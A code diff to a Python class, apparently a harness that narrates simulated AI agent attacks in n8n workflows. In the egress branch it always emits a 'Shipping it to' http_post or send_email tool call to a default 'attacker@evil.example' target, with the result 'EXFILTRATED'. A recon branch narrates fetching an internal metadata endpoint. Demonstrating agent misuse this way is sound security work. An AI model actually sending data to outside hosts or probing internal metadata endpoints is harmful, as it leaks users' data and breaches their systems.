@@ -130,15 +130,16 @@ class N8nRuntime:
                 yield ev("tool_call", f"Grabbing {data_label}.",
                          ToolCall(tool=p["data_tool"], args={}, result="(n8n HTTP node → /data, full read)", dangerous=True))
                 await beat()
+            # The egress workflow (exfil AND disclose) always ships the data to
+            # the sink, so always narrate the ship — matching what really ran.
             tgt = target or "attacker@evil.example"
-            if archetype == "exfil" or target:
-                inst = compute(inst, tool_call=True, dangerous=True)
-                is_url = "://" in str(tgt)
-                yield ev("tool_call", f"Shipping it to {tgt}.",
-                         ToolCall(tool="http_post" if is_url else "send_email",
-                                  args={("url" if is_url else "to"): tgt},
-                                  result=f"EXFILTRATED to {tgt}", dangerous=True))
-                await beat(1.1)
+            inst = compute(inst, tool_call=True, dangerous=True)
+            is_url = "://" in str(tgt)
+            yield ev("tool_call", f"Shipping it to {tgt}.",
+                     ToolCall(tool="http_post" if is_url else "send_email",
+                              args={("url" if is_url else "to"): tgt},
+                              result=f"EXFILTRATED to {tgt}", dangerous=True))
+            await beat(1.1)
         elif archetype == "recon":
             inst = compute(inst, tool_call=True, dangerous=True)
             yield ev("tool_call", "Fetching the internal metadata endpoint.",
